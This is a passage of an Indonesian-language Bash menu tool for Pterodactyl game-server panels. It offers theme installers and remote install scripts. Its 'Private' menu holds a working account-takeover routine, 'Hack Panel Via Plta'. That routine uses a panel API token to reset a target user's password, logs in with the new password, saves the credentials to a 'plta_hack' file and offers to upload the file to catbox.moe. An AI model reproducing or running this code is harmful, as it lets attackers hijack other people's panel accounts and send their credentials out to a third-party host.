    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return 1
  fi

  log_success "✓ Data user ditemukan: $USERNAME ($EMAIL)"

  # ========== STEP 3: GENERATE PASSWORD BARU ==========
  log_info "[3/5] Generate password baru..."
  NEW_PASSWORD=$(tr -dc 'A-Za-z0-9!@#$%' < /dev/urandom | head -c 16)
  log_success "✓ Password: $NEW_PASSWORD"

  # ========== STEP 4: UPDATE PASSWORD ==========
  log_info "[4/5] Mengupdate password user ID $TARGET_ID..."
  UPDATE_DATA="{
    \"username\": \"$USERNAME\",
    \"email\": \"$EMAIL\",
    \"first_name\": \"$FIRST_NAME\",
    \"last_name\": \"$LAST_NAME\",
    \"password\": \"$NEW_PASSWORD\"
  }"

  UPDATE_RESPONSE=$(curl -k -s -X PATCH "$PANEL_URL/api/application/users/$TARGET_ID" \
    -H "Authorization: Bearer $PLTA_TOKEN" \
    -H "Accept: application/json" \
    -H "Content-Type: application/json" \
    -d "$UPDATE_DATA")

  if echo "$UPDATE_RESPONSE" | grep -q "error"; then
    print_warning "Update via API aplikasi gagal, mencoba endpoint lain..."
    UPDATE_CLIENT="{\"password\":\"$NEW_PASSWORD\"}"
    UPDATE_RESPONSE=$(curl -k -s -X PUT "$PANEL_URL/api/client/account/password" \
      -H "Authorization: Bearer $PLTA_TOKEN" \
      -H "Accept: application/json" \
      -H "Content-Type: application/json" \
      -d "$UPDATE_CLIENT")

    if echo "$UPDATE_RESPONSE" | grep -q "success\|ok"; then
      log_success "✓ Password berhasil diupdate via client endpoint!"
    else
      print_error "Gagal update password! Mungkin token tidak punya hak akses write."
      echo "$UPDATE_RESPONSE" | head -3
    fi
  else
    log_success "✓ Password berhasil diupdate!"
  fi

  # ========== STEP 5: AMBIL DATA TAMBAHAN ==========
  log_info "[5/5] Mengambil informasi tambahan..."
  SERVERS_RESPONSE=$(curl -k -s -X GET "$PANEL_URL/api/application/users/$TARGET_ID" \
    -H "Authorization: Bearer $PLTA_TOKEN" \
    -H "Accept: application/json" 2>/dev/null)

  SERVER_COUNT=$(echo "$SERVERS_RESPONSE" | grep -o '"servers_count":[0-9]*' | head -1 | cut -d':' -f2)
  [ -z "$SERVER_COUNT" ] && SERVER_COUNT="?"

  JWT_RESPONSE=$(curl -k -s -X POST "$PANEL_URL/api/application/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$EMAIL\",\"password\":\"$NEW_PASSWORD\"}" 2>/dev/null)

  JWT_TOKEN=$(echo "$JWT_RESPONSE" | grep -o '"token":"[^"]*' | head -1 | cut -d'"' -f4)

  # ========== TAMPILKAN HASIL DI TERMINAL ==========
  clear
  echo -e "${BRIGHT_GREEN}${BOLD}"
  echo "  ███████╗███████╗██████╗ ███████╗██╗     ███████╗"
  echo "  ██╔════╝██╔════╝██╔══██╗██╔════╝██║     ██╔════╝"
  echo "  ███████╗█████╗  ██████╔╝█████╗  ██║     █████╗  "
  echo "  ╚════██║██╔══╝  ██╔═══╝ ██╔══╝  ██║     ██╔══╝  "
  echo "  ███████║███████╗██║     ███████╗███████╗███████╗"
  echo "  ╚══════╝╚══════╝╚═╝     ╚══════╝╚══════╝╚══════╝"
  echo -e "${NC}"
  echo -e "${BRIGHT_CYAN}${BOLD}                    D E C K${NC}"
  echo ""

  # ========== SIMPAN KE FILE ==========
  RESULT_FILE="/root/plta_hack_${TARGET_ID}_$(date +%Y%m%d_%H%M%S).txt"
  cat > "$RESULT_FILE" << EOF
==========================
⚡ SUKSESS BY ZYURA ⚡
==========================

🎯 TARGET
URL Panel    : $PANEL_URL
ID User      : $TARGET_ID 
Admin        : $([ "$ROOT_ADMIN" == "true" ] && echo "✅" || echo "❌")

👤 AKUN
Username     : $USERNAME
Email        : $EMAIL
Nama         : $FIRST_NAME $LAST_NAME

🔑 PASSWORD BARU
$NEW_PASSWORD

🔗 LOGIN
$PANEL_URL/auth/login

⚠️  Password udah diganti, login pake email di atas.

SEPELE DECK HAYYU PEMULA NIH
==========================
EOF

  echo -e "${GREEN}📁 Hasil disimpan di: ${BRIGHT_WHITE}$RESULT_FILE${NC}"

  # ========== UPLOAD KE CATBOX ==========
  echo ""
  echo -n -e "${BOLD}Upload hasil ke Catbox.moe? (y/n): ${NC}"
  read UPLOAD_CONFIRM
  
  if [[ "$UPLOAD_CONFIRM" =~ ^[Yy]$ ]]; then
    log_info "📤 Mengupload file ke Catbox.moe..."
    
    # Panggil fungsi upload
    CATBOX_URL=$(upload_to_catbox "$RESULT_FILE" 2>&1)
    
    # Cek apakah upload berhasil (response berupa URL)
    if [[ "$CATBOX_URL" =~ ^https?:// ]]; then
      log_success "✓ File berhasil diupload!"
      echo -e "  ${CYAN}URL:${NC} ${BRIGHT_WHITE}$CATBOX_URL${NC}"
      
      # Tampilkan link dengan box biar keren
      echo -e "\n${BRIGHT_YELLOW}🔗 LINK DOWNLOAD:${NC}"
      echo -e "${BRIGHT_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
      echo -e "${BRIGHT_WHITE}$CATBOX_URL${NC}"
      echo -e "${BRIGHT_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
      
      # Simpan URL ke file terpisah
      URL_FILE="/root/plta_hack_${TARGET_ID}_link.txt"
      echo "$CATBOX_URL" > "$URL_FILE"
      echo -e "  ${GREEN}URL juga disimpan di:${NC} $URL_FILE"
      
      # Tampilkan juga QR code? (optional)
      echo -e "\n  ${YELLOW}Scan QR code untuk download:${NC}"
      curl -s "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=$CATBOX_URL" > /tmp/qrcode.png 2>/dev/null
      echo "  [QR Code generated - lihat di /tmp/qrcode.png]"
    else
      print_warning "Gagal upload ke Catbox:"
      echo "$CATBOX_URL"
    fi
  else
    log_info "ℹ️  Upload dibatalkan, file hanya disimpan lokal."
    echo -e "  ${YELLOW}File lokal:${NC} $RESULT_FILE"
  fi

  # ========== RINGKASAN AKHIR ==========
  echo ""
  echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
  echo -e "${BRIGHT_GREEN}${BOLD}           ✅ COMPLETED!${NC}"
  echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
  echo -e "  ${WHITE}Target ID:${NC} $TARGET_ID"
  echo -e "  ${WHITE}Username:${NC} $USERNAME"
  echo -e "  ${WHITE}Email:${NC} $EMAIL"
  echo -e "  ${WHITE}Password:${NC} ${BRIGHT_RED}$NEW_PASSWORD${NC}"
  echo -e "  ${WHITE}File hasil:${NC} $RESULT_FILE"
  if [[ "$UPLOAD_CONFIRM" =~ ^[Yy]$ ]] && [[ "$CATBOX_URL" =~ ^https?:// ]]; then
    echo -e "  ${WHITE}Catbox URL:${NC} $CATBOX_URL"
  fi
  echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
  
  echo ""
  echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
  read
}
private_tools_menu() {
  while true; do
    clear
    show_banner
    show_menu_header
    echo -e "${BRIGHT_MAGENTA}${BOLD}🔒 PRIVATE TOOLS MENU${NC}"
    echo -e "${BRIGHT_RED}${BOLD}[1]${NC} Hack Panel Via Plta"
    echo -e "${BRIGHT_RED}[0]${NC} Kembali ke Menu Utama"
    show_menu_header
    echo -n -e "${BOLD}Pilih [1/0]: ${NC}"
    read PRIVATE_CHOICE

    case "$PRIVATE_CHOICE" in
      1) hack_server_panel_plta ;;
      0) return ;;
      *) print_error "Pilihan tidak valid!"; sleep 2 ;;
    esac
  done
}
# ============================================================
# FUNGSI zyura TOOLS - Panel Installation
# ============================================================

zyura_panel_install() {
  run_remote_script "https://raw.githubusercontent.com/zyuraprivatescript/Vps/refs/heads/main/cd/panel2.sh"
}

# ============================================================
# FUNGSI zyura TOOLS - Wings Installation
# ============================================================

zyura_wings_install() {
  run_remote_script "https://raw.githubusercontent.com/zyuraprivatescript/Vps/refs/heads/main/cd/wing2.sh"
}

# ============================================================
# FUNGSI zyura TOOLS - Uninstall Tools
# ============================================================

zyura_uninstall_tools() {
  run_remote_script "https://raw.githubusercontent.com/zyuraprivatescript/Vps/refs/heads/main/cd/uninstall2.sh"
}

# ============================================================
# FUNGSI zyura TOOLS - Cloudflare Setup
# ============================================================

zyura_cloudflare_setup() {
  run_remote_script "https://raw.githubusercontent.com/zyuraprivatescript/Vps/refs/heads/main/cd/cloudflare.sh"
}


# ============================================================
# MENU PILIHAN THEME (LENGKAP DENGAN SEMUA OPSI)
# ============================================================

theme_menu() {
  while true; do
    clear
    show_banner
    show_menu_header
    echo -e "${BRIGHT_GREEN}${BOLD}📦 STANDARD THEMES${NC}"
    echo -e "${BRIGHT_YELLOW}[1]${NC} Stellar"
    echo -e "${BRIGHT_YELLOW}[2]${NC} Billing"
    echo -e "${BRIGHT_YELLOW}[3]${NC} Enigma"
    echo -e "${BRIGHT_YELLOW}[4]${NC} Elysium"
    echo -e "${BRIGHT_YELLOW}[5]${NC} Frostcore"
    echo -e "${BRIGHT_YELLOW}[6]${NC} Nightcore"
    echo -e "${BRIGHT_YELLOW}[7]${NC} IceMinecraft"
    echo -e "${BRIGHT_YELLOW}[8]${NC} Noobe"
    echo -e "${BRIGHT_YELLOW}[9]${NC} Reviactyl"
    show_menu_header
    echo -e "${BRIGHT_MAGENTA}${BOLD}🔷 BLUEPRINT THEMES${NC} (wajib install blueprint dulu)"
    echo -e "${BRIGHT_CYAN}[b1]${NC} Nebula V1.8-3"
    echo -e "${BRIGHT_CYAN}[b2]${NC} Nebula V2.0-1"
    echo -e "${BRIGHT_CYAN}[b3]${NC} Recolor"
    echo -e "${BRIGHT_CYAN}[b4]${NC} NavySeals"
    echo -e "${BRIGHT_CYAN}[b5]${NC} LememTheme"
    echo -e "${BRIGHT_CYAN}[b6]${NC} Darkenate"
    show_menu_header
    echo -e "${BRIGHT_YELLOW}[10]${NC} 🔷 Install Blueprint Framework"
    echo -e "${BRIGHT_YELLOW}[11]${NC} 🔄 Reset Panel (Hapus semua modifikasi)"
    echo -e "${BRIGHT_YELLOW}[12]${NC} ❌ Uninstall Panel (Hapus total)"
    echo -e "${BRIGHT_RED}[0]${NC} Kembali ke Menu Utama"
    show_menu_header
    echo -n -e "${BOLD}Pilih [1-12/b1-6/0]: ${NC}"
    read SELECT_THEME

    case "$SELECT_THEME" in
      1) install_standard_theme "Stellar" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/stellar.zip" "1" ;;
      2) install_standard_theme "Billing" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/billing.zip" "2" ;;
      3) install_standard_theme "Enigma" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/enigma.zip" "3" ;;
      4) install_standard_theme "Elysium" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/elysium.zip" "4" ;;
      5) install_standard_theme "Frostcore" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/frostcore.zip" "5" ;;
      6) install_standard_theme "Nightcore" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/nightcore.zip" "6" ;;
      7) install_standard_theme "IceMinecraft" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/ice.zip" "7" ;;
      8) install_standard_theme "Noobe" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/noobe.zip" "8" ;;
      9) install_timpa "https://github.com/reviactyl/panel/releases/latest/download/panel.tar.gz" "Reviactyl" ;;
      10) install_blueprint_framework ;;
      11) reset_panel ;;
      12) uninstall_panel_full ;;
      [bB]1) install_blueprint_theme "Nebula V1.8-3" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/nebula_v1.8-3.zip" ;;
      [bB]2) install_blueprint_theme "Nebula V2.0-1" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/nebula_v2.0-1.zip" ;;
      [bB]3) install_blueprint_theme "Recolor" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/recolor.zip" ;;
      [bB]4) install_blueprint_theme "NavySeals" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/navyseals.zip" ;;
      [bB]5) install_blueprint_theme "LememTheme" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/lemem.zip" ;;
      [bB]6) install_blueprint_theme "Darkenate" "https://github.com/zyuraprivatescript/Vps/raw/main/theme/darkenate.zip" ;;
      0) return ;;
      *) print_error "Pilihan tidak valid!"; sleep 2 ;;
    esac
  done
}

# ============================================================
# MAIN MENU UTAMA (GABUNGAN) - UPDATE
# ============================================================

main_menu() {
  while true; do
    clear
    show_banner
    show_menu_header
    echo -e "  ${WHITE}${NC}  ${BRIGHT_CYAN}${BOLD}[1]${NC}  Install Themes Pterodactyl                        ${WHITE}${NC}"
    echo -e "  ${WHITE}${NC}  ${BRIGHT_CYAN}${BOLD}[2]${NC}  Cek Spesifikasi VPS                               ${WHITE}${NC}"
    echo -e "  ${WHITE}${NC}  ${BRIGHT_YELLOW}${BOLD}[3]${NC}  Panel Installation                              ${WHITE}${NC}"
    echo -e "  ${WHITE}${NC}  ${BRIGHT_YELLOW}${BOLD}[4]${NC}  Wings Installation                              ${WHITE}${NC}"
    echo -e "  ${WHITE}${NC}  ${BRIGHT_YELLOW}${BOLD}[5]${NC}  Uninstall Tools                                 ${WHITE}${NC}"
    echo -e "  ${WHITE}${NC}  ${BRIGHT_YELLOW}${BOLD}[6]${NC}  Cloudflare Setup                                ${WHITE}${NC}"
    echo -e "  ${WHITE}${NC}  ${BRIGHT_GREEN}${BOLD}[7]${NC}  Create Node & Location                         ${WHITE}${NC}"
        echo -e "  ${WHITE}${NC}  ${BRIGHT_GREEN}${BOLD}[8]${NC}  Installation Protect Panel                         ${WHITE}${NC}"
        echo -e "  ${WHITE}${NC}  ${BRIGHT_GREEN}${BOLD}[9]${NC}  Private                          ${WHITE}${NC}"
    echo -e "  ${WHITE}${NC}  ${BRIGHT_RED}[x] Keluar${NC}                                                      ${WHITE}${NC}"
    show_menu_header
    echo -n -e "${BOLD}Masukkan pilihan [1-7/x]: ${NC}"
    read MENU_CHOICE

    case "$MENU_CHOICE" in
      1) theme_menu ;;
      2) check_vps_spec ;;
      3) zyura_panel_install ;;
      4) zyura_wings_install ;;
      5) zyura_uninstall_tools ;;
      6) zyura_cloudflare_setup ;;
      7) create_node ;;  # <-- TAMBAHKAN INI
      8) protect_menu ;;
      9) private_tools_menu ;;
      x|X) 
        echo ""
        echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${BRIGHT_GREEN}${BOLD}   Terima kasih telah menggunakan ZYURA MULTIFUNGSI!${NC}"
        echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${BRIGHT_GREEN}${BOLD}   Telegram: @akuzyura${NC}"
        echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
        echo ""
        exit 0 
        ;;
      *) 
        print_error "Pilihan tidak valid!"
        sleep 2 
        ;;
    esac
  done
}
# ============================================================
# START SCRIPT
# ============================================================

# Cek root
if [[ $EUID -ne 0 ]]; then
   echo ""
   echo -e "${BRIGHT_RED}${BOLD}╔════════════════════════════════════════════╗${NC}"
   echo -e "${BRIGHT_RED}${BOLD}║  Script ini harus dijalankan sebagai root! ║${NC}"
   echo -e "${BRIGHT_RED}${BOLD}║  Gunakan: sudo bash $0                     ║${NC}"
   echo -e "${BRIGHT_RED}${BOLD}╚════════════════════════════════════════════╝${NC}"
   echo ""
   exit 1
fi

# Jalankan main menu
main_menu
